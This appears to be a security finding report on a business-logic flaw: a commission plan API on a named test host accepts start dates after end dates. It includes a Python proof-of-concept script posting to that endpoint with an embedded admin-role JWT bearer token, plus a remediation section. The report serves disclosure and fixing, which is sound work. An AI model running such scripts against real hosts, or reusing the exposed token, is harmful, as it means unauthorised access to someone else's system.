# Invalid Date Ranges Allowed in Commission Plan Creation

**ID:** vuln-0049
**Severity:** HIGH
**Found:** 2026-02-26 19:53:08 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 7.6

## Description

A business logic vulnerability was discovered in the commission plan creation functionality that allows invalid date ranges to be set. The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts commission plans where the start date is after the end date without proper validation.

This vulnerability enables the creation of commission plans with logically impossible date ranges, which could lead to incorrect commission calculations, processing errors, and operational issues. An attacker could create commission plans with invalid date ranges to disrupt business processes or manipulate financial calculations.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Incorrect Commission Calculations**: Commission plans with invalid date ranges may not process correctly or may process at unexpected times
2. **Operational Disruption**: Invalid date ranges could cause errors in commission processing workflows
3. **Financial Discrepancies**: Commission calculations based on invalid date ranges could lead to incorrect payouts
4. **Audit and Compliance Issues**: Invalid commission structures could violate financial regulations and audit requirements
5. **Business Process Confusion**: Sales representatives and administrators may be confused by commission plans with illogical date ranges
6. **System Errors**: Invalid date ranges could cause exceptions or errors in commission processing systems

The business impact includes potential financial discrepancies, operational inefficiencies, and increased costs for resolving commission calculation errors.

## Technical Analysis

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint which lacks proper business logic validation for date range parameters. The system accepts any date values without validating that the start date should be before the end date.

**Root Cause Analysis:**
1. Missing input validation for date range parameters
2. Lack of business logic validation to ensure chronological date order
3. Insufficient server-side validation of commission plan parameters
4. No approval workflow for commission plans with unusual date ranges

**Technical Details:**
- Endpoint: `POST /api/CommissionPlan/CreateCommissionPlan`
- Vulnerable Parameters: `startDate` and `endDate`
- Accepted Values: Any date values where startDate > endDate
- Expected Behavior: Start date should be validated to be before end date
- Actual Behavior: Invalid date ranges are accepted and processed

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission plan creation privileges
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with a start date after the end date
3. Verify that the commission plan is created successfully with the invalid date range
4. Observe that the invalid date range could affect commission processing

**Proof-of-Concept Steps:**
1. Create a commission plan with start date after end date
2. Attempt to process commissions using the invalid plan
3. Verify that the system accepts the invalid date range
4. Confirm potential issues with commission calculations

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
CREATE_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Authentication token (replace with valid token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Headers
headers = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

# Invalid date range commission plan payload
invalid_date_plan_payload = {
    "planName": "Invalid Date Range Plan",
    "description": "Commission plan with start date after end date",
    "commissionPercentage": 10,
    "startDate": "2026-12-31",  # Start date after end date
    "endDate": "2026-01-01",    # End date before start date
    "isActive": True,
    "organizationId": 1,
    "clientId": 1
}

def test_invalid_date_range():
    """Test creation of commission plan with invalid date range"""
    print("Testing invalid date range vulnerability...")

    try:
        # Create commission plan with invalid date range
        response = requests.post(
            CREATE_PLAN_ENDPOINT,
            headers=headers,
            data=json.dumps(invalid_date_plan_payload),
            timeout=10
        )

        # Check response
        if response.status_code == 200:
            print(f"✓ SUCCESS: Commission plan created with invalid date range")
            print(f"Response: {response.text}")
            return True
        else:
            print(f"✗ FAILED: Status code {response.status_code}")
            print(f"Response: {response.text}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")
        return False

if __name__ == "__main__":
    success = test_invalid_date_range()
    if success:
        print("\nVULNERABILITY CONFIRMED: Invalid date ranges are accepted")
        print("Impact: This could lead to incorrect commission calculations and operational issues")
    else:
        print("\nVulnerability not confirmed or error occurred during testing")
```

## Remediation

Implement comprehensive validation and business logic checks to prevent invalid date ranges in commission plans:

1. **Input Validation**:
   - Add server-side validation to ensure `startDate` is before `endDate`
   - Implement date range validation for all date parameters
   - Add validation for reasonable date ranges (e.g., not spanning decades)

2. **Business Logic Validation**:
   - Add business logic validation to ensure date ranges make sense in context
   - Implement approval workflows for commission plans with unusual date ranges
   - Add validation to prevent logically impossible commission structures

3. **Database Constraints**:
   - Add database-level constraints to ensure chronological date order
   - Implement triggers or stored procedures to validate commission plan data

4. **Monitoring and Alerting**:
   - Implement monitoring for commission plans with unusual date ranges
   - Set up alerts for invalid date ranges or other suspicious configurations
   - Log and review all commission plan creation and modification events

5. **Financial Controls**:
   - Implement financial controls to detect and prevent incorrect commission calculations
   - Add reconciliation processes to identify discrepancies in commission payouts
   - Implement approval workflows for high-impact commission plan changes

6. **Code Fix Example**:
```csharp
// Add validation in the commission plan creation logic
public IActionResult CreateCommissionPlan(CommissionPlanDto planDto)
{
    // Validate date range
    if (planDto.StartDate > planDto.EndDate)
    {
        return BadRequest("Start date must be before end date");
    }

    // Validate commission percentage
    if (planDto.CommissionPercentage < 0 || planDto.CommissionPercentage > 100)
    {
        return BadRequest("Commission percentage must be between 0 and 100");
    }

    // Proceed with plan creation
    // ...
}
```

